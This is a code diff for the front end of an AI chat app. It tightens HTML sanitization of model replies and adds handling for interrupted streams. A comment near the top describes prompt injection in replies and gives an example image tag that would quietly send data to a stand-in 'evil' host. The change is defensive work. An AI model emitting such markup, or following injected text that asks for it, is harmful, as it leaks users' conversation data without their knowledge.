@@ -13,6 +13,23 @@ const ACTIVITY_LABELS = {
   read_file: "📄 Reading file:",
 };
 
+// AC-25: replies may contain text written by web pages or files (prompt injection). Besides
+// blocking scripts, never let a reply load remote content: an <img src="https://evil/?data">
+// would send data out without a click. The server's Content-Security-Policy backs this up.
+const SANITIZE_OPTIONS = {
+  FORBID_TAGS: ["img", "picture", "source", "video", "audio", "track", "svg", "math", "iframe",
+    "object", "embed", "form", "input", "button", "style", "link", "meta", "base"],
+  FORBID_ATTR: ["style", "srcset", "background", "poster"],
+};
+
+// Links in replies open in a new tab, so following one doesn't discard the conversation.
+DOMPurify.addHook("afterSanitizeAttributes", (node) => {
+  if (node.tagName === "A") {
+    node.setAttribute("target", "_blank");
+    node.setAttribute("rel", "noopener noreferrer");
+  }
+});
+
 let conversationId = null;
 let busy = false;
 let controller = null;
@@ -57,14 +74,14 @@ function createReply() {
   let markdown = "";
 
   return {
-    text(delta) {
+    text({ text }) {
       if (segment === null) {
         segment = addElement(container, "div", "markdown");
         markdown = "";
       }
-      markdown += delta;
+      markdown += text;
       // AC-25: render Markdown, and sanitize so no HTML or script in a reply can run.
-      segment.innerHTML = DOMPurify.sanitize(marked.parse(markdown));
+      segment.innerHTML = DOMPurify.sanitize(marked.parse(markdown), SANITIZE_OPTIONS);
     },
     activity({ kind, detail }) {
       const label = ACTIVITY_LABELS[kind] || "Using tool:";
@@ -91,13 +108,14 @@ function createReply() {
   };
 }
 
+// Returns true when the server finished the reply ("done"), false if the stream broke off.
 async function readEvents(response, reply) {
   const reader = response.body.getReader();
   const decoder = new TextDecoder();
   let buffer = "";
   for (;;) {
     const { value, done } = await reader.read();
-    if (done) return;
+    if (done) return false;
     buffer += decoder.decode(value, { stream: true });
     let boundary;
     while ((boundary = buffer.indexOf("\n\n")) !== -1) {
@@ -107,7 +125,7 @@ async function readEvents(response, reply) {
         chunk.split("\n").map((line) => [line.slice(0, line.indexOf(": ")), line.slice(line.indexOf(": ") + 2)]),
       );
       const data = JSON.parse(fields.data);
-      if (fields.event === "done") return;
+      if (fields.event === "done") return true;
       if (fields.event in reply) reply[fields.event](data);
       scrollToBottom();
     }
@@ -133,9 +151,10 @@ async function send() {
     });
     if (!response.ok) {
       const body = await response.json().catch(() => ({}));
-      reply.error({ message: body.detail || `Request failed (${response.status}).` });
-    } else {
-      await readEvents(response, reply);
+      const detail = typeof body.detail === "string" ? body.detail : null; // 422: detail is a list
+      reply.error({ message: detail || `Request failed (${response.status}).` });
+    } else if (!(await readEvents(response, reply))) {
+      reply.error({ message: "The reply was interrupted. Please try again." });
     }
   } catch (error) {
     if (error.name !== "AbortError") reply.error({ message: "Lost connection to the app." });
